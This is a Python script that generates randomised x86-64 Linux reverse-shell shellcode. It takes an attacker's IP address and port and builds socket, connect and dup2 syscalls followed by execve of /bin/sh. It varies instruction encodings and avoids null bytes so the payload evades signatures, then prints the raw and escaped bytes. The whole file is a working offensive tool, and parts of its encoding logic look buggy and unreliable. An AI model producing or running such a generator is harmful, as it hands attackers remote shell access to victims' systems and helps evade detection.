#!/usr/bin/python3
import struct
import random
import argparse
import secrets

# Set a dictionary with all the register
registerDictionary = {"rax":0,"rcx":1,"rdx":2,"rbx":3,"rsp":4,"rbp":5,"rsi":6,"rdi":7}


# Set all register to 0 
def setRegToZero(reg):
    chunk = bytearray()
    case = random.randint(1,3)

# Use match case for the different method 
    match case:
        case 1: # Xor with itself method
            xor = bytearray([0x48,0x31,(0xC0+(registerDictionary[reg]*9))])
            chunk += xor
        case 2: # Double shift right 32 method
            
            shift = bytearray([0x48,0xC1,(0xE8+registerDictionary[reg]),0x20])
            chunk += shift
            chunk += shift
        case 3: # push -1, pop and not 
            chunk.append(0x68)
            value = bytearray(struct.pack("<i",-1))
            for i in value :
                chunk.append(i)
            
            chunk.append((0x58+registerDictionary[reg]))

            not_op =  bytearray([0x48,0xf7,(0xD0+registerDictionary[reg])])
            chunk += not_op
            
    return chunk

# Move value to address with 1 and 0 management for avoiding null bytes
def preciseMovToMemory(value):
    chunk = bytearray()
    value = bytearray(value)

    case = random.randint(1,1)

    match case:
        case 1: #mov to address method bytes per bytes
            precisemov = bytearray([0x48,0x89,0xE3])
            for i in range(len(value)):
                if value[i] != 0:
                    precisemov.append(0xC6)
                    precisemov.append((0x03))
                    precisemov.append(value[i])
                    precisemov.append(0x48)
                    precisemov.append(0xff)
                    precisemov.append(0xC3)
                else:
                    precisemov.append(0xC6)
                    precisemov.append((0x03))
                    precisemov.append(value[i]+1)
                    precisemov.append(0x80)
                    precisemov.append(0x2B)
                    precisemov.append(0x01)
                    precisemov.append(0x48)
                    precisemov.append(0xff)
                    precisemov.append(0xC3)
            chunk += precisemov

    return chunk

# Move value to register with different method 
# it is only possible to move a value under or equal to 4 bytes
def movValueToReg(reg,value):
    chunk = bytearray()
    case = random.randint(1,3)
    case = 4
    
    match case:
        case 1: # The push, pop, neg method
            chunk.append(0x68)
            value = -value
            value = bytearray(struct.pack("<i",value))
            for i in value :
                chunk.append(i)
            
            chunk.append((0x58+registerDictionary[reg]))

            neg = bytearray([0x48,0xf7,(0xD8+registerDictionary[reg])])

            chunk += neg

        case 2: # The push, pop, not method
            chunk.append(0x68)
            value = -value
            value = bytearray(struct.pack("<i",value))
            for i in value :
                chunk.append(i)
            
            chunk.append((0x58+registerDictionary[reg]))

            not_op =  bytearray([0x48,0xf7,(0xD0+registerDictionary[reg])])
            chunk += not_op
            inc_ope = bytearray([0x48,0xff,(0xC0+registerDictionary[reg])])
            chunk += inc_ope

        case 3: # the mov and shift method
            value = bytearray(struct.pack(">i",value))
            mov_n_shift = bytearray()
            if reg  in  ("rax" , "rcx" , "rdx" , "rbx"): 
                for i in value:
                    mov_n_shift.append(0x48)
                    mov_n_shift.append(0xC1)
                    mov_n_shift.append((0xE0+registerDictionary[reg]))
                    mov_n_shift.append(0x08)
                    if i != 0:
                        mov_n_shift.append((0xb0+registerDictionary[reg]))
                        mov_n_shift.append(i)
                chunk += mov_n_shift
            else:
                for i in value:
                    mov_n_shift.append(0x48)
                    mov_n_shift.append(0xC1)
                    mov_n_shift.append((0xE0+registerDictionary[reg]))
                    mov_n_shift.append(0x08)
                    if i != 0:
                        mov_n_shift.append(0x40)
                        mov_n_shift.append((0xb0+registerDictionary[reg]))
                        mov_n_shift.append(i)
                    
                chunk += mov_n_shift
        case 4: # the mask method

            while(True):
                mask = secrets.token_bytes(4)
                print(mask)
                
                mask = int.from_bytes(mask)
                complement = mask - value
                complement = -complement
                

                mask = bytearray(struct.pack("<I",mask))
                print(int.from_bytes(mask))

                complement = bytearray(struct.pack("<q",complement))

                if 0x00 in complement or 0x00 in mask:
                    continue
                break

            mov = bytearray([(0xB8 + registerDictionary[reg])])
            mov += mask
            chunk += mov
            
            if reg == "rax":
                addition = bytearray([0x48, 0x05])
                addition += complement[0:4]
            else:
                addition = bytearray([0x48,0x81,(0xC0 + registerDictionary[reg])])
                addition += complement[0:4]
    
            addition += bytearray([0x89, (0xC0 + registerDictionary[reg]*9)])

            chunk += addition

    return chunk

# Move WORD size to memory with mov
def movWORDToMemory(offset,reg):
    chunk = bytearray()
    case = random.randint(1,1)

    match case:
        case 1: #mov to address method
            mov = bytearray([0x66,0x89, (0x04+(registerDictionary[reg]*8)),0x24])
            if offset != 0:
                mov[2] += 0x40
                mov.append(offset)
            chunk += mov

    return chunk

# Move DWORD size to memory with mov
def movDWORDToMemory(offset,reg):
    chunk = bytearray()
    case = random.randint(1,1)

    match case:
        case 1: #mov to address method
            mov = bytearray([0x89, (0x04+(registerDictionary[reg]*8)),0x24])
            if offset != 0:
                mov[1] += 0x40
                mov.append(offset)
            chunk += mov

    return chunk

# Move QWORD size to memory with mov
def movQWORDToMemory(offset,reg):
    chunk = bytearray()
    case = random.randint(1,1)

    match case:
        case 1: #mov to address method
            mov = bytearray([0x48,0x89, (0x04+(registerDictionary[reg]*8)),0x24])
            if offset != 0:
                mov[2] += 0x40
                mov.append(offset)
            chunk += mov

    return chunk

# Move BYTE size to memory with mov 
def movBYTEToMemory(offset,reg):
    chunk = bytearray()
    case = random.randint(1,1)

    match case:
        case 1: #mov to address method
            mov = bytearray([0x88, (0x04+(registerDictionary[reg]*8)),0x24])
            if offset != 0:
                mov[1] += 0x40
                mov.append(offset)
            chunk += mov

    return chunk

# Move WORD to stack with push 
def pushWORDToStack(reg):
    chunk = bytearray()
    case = random.randint(1,1)

    match case:
        case 1: #push to stack method
            push = bytearray([0x66,0x50+(registerDictionary[reg])])
            chunk += push

    return chunk

# Move DWORD to stack with mov
def pushDWORDToStack(reg):
    chunk = bytearray()
    case = random.randint(1,1)

    match case:
        case 1: #push to stack method
            push = bytearray([0x50+(registerDictionary[reg])])
            chunk += push

    return chunk

# Move register to register with different method 
def movRegtoReg(regsrc,regdst):
    chunk = bytearray()
    case = random.randint(1,3)

    match case:
        case 1: #push and pop method 
            push = bytearray([0x50+(registerDictionary[regsrc])])
            pop = bytearray([0x58+(registerDictionary[regdst])])
            chunk += push
            chunk += pop
        case 2: #mov method
            mov = bytearray([0x48,0x89,(0xC0+(registerDictionary[regsrc]*8)+(registerDictionary[regdst]))])
            chunk += mov
        case 3: # The xor method
            xor = setRegToZero(regdst)
            xor += bytearray([0x48,0x31,(0xC0+(registerDictionary[regsrc]*8)+(registerDictionary[regdst]))])
            chunk += xor 

    return chunk

def main():
    # Arg definition
    parser = argparse.ArgumentParser(description="Generate shellcode with IP and port arguments")
    parser.add_argument("-i", "--ip", required=True, help="IP address")
    parser.add_argument("-p", "--port", required=True, help="Port number")

    args = parser.parse_args()
    ip = args.ip
    port = args.port

    # Define format for the var
    port = struct.pack("<h", int(port))
    ip = ip.split(".")
    ip = list(map(int,ip))
    ip = bytearray(ip)
    ip = bytes(ip)
    ip = int.from_bytes(ip)
    ip = struct.pack("<i", ip)
    ip = int.from_bytes(ip)
    port = int.from_bytes(port)


    
    syscall = bytearray([0x0f,0x05])



    # Generate the shellcode with all the fonctions and switch case
    # sub something to rsp

    shellcode = bytearray()

    shellcode += movValueToReg("rdi",0x02) # Socket ARG0 : 2 = AF_INET
    shellcode += movValueToReg("rsi",0x01) # Socket ARG1 : 1 = SOCK_STREAM
    shellcode += setRegToZero("rdx") # SOCKET ARG2 ; 0 = IPPROTO_IP
    shellcode += movValueToReg("rax",0x29) # Socket syscall Number
    shellcode += syscall # socket
    shellcode += movRegtoReg("rax","rdi") # Save Socket Number to RDI (Connect ARG0)

    
    # Putting the Sockaddr Struct in memory 
    shellcode += movValueToReg("rax",0x0002) #  WORD AF_INET
    shellcode += movWORDToMemory(0,"rax")
    shellcode +=movValueToReg("rax",port) # WORD PORT
    shellcode += movWORDToMemory(2,"rax")
    shellcode +=movValueToReg("rax",ip) # DWORD in_addr
    shellcode += movDWORDToMemory(4,"rax")
    shellcode += setRegToZero("rax") # QWORD Padding
    shellcode += movQWORDToMemory(8,"rax")

    shellcode += movRegtoReg("rsp","rsi") # Connect ARG1 : ptr* to Sockaddr Struct
    shellcode += movValueToReg("rdx",0x10) # Connect ARG2 : Sockaddr_size
    shellcode += movValueToReg("rax",0x2a) # Connect syscall number
    shellcode += syscall # connect

    shellcode  += setRegToZero("rsi") # Dup2 ARG1 : newfd(0=STDIN)
    shellcode += movValueToReg("rax",0x21) # Dup2 syscall number
    shellcode += syscall # dup2

    shellcode += movValueToReg("rsi",0x01) # Dup2 ARG1 : newfd(1=STDOUT)
    shellcode += movValueToReg("rax",0x21) # Dup2 syscall number
    shellcode += syscall # dup2

    shellcode += movValueToReg("rsi",0x02) # Dup2 ARG1 : newfd(2=STDERR)
    shellcode += movValueToReg("rax",0x21) # Dup2 syscall number
    shellcode += syscall # dup2


    
    shellcode += preciseMovToMemory(b'/bin/sh\x00') # Putting /bin/sh string in memory
    shellcode += movRegtoReg("rsp","rdi") # execve ARG0 : Ptr* to command
    shellcode += setRegToZero("rsi") # execve ARG1 : Args
    shellcode += setRegToZero("rdx") # execve ARG2 : Env
    shellcode += movValueToReg("rax",0x3b) # execve syscall number
    shellcode += syscall # execve

    # Format output
    print("Shellcode Length: {}".format(len(shellcode)))
    print("RAW hellcode: ",end='\n\n')
    for i in shellcode:
        if i < 16:
            print("0{}".format(hex(i).lstrip("0x")),end='')
        else:
            print("{}".format(hex(i).lstrip("0x")),end='')

    print("\n\nFormatted hellcode: ",end='\n\n')
    for i in shellcode:
        if i < 16:
            print("\\x0{}".format(hex(i).lstrip("0x")),end='')
        else:
            print("\\x{}".format(hex(i).lstrip("0x")),end='')

main()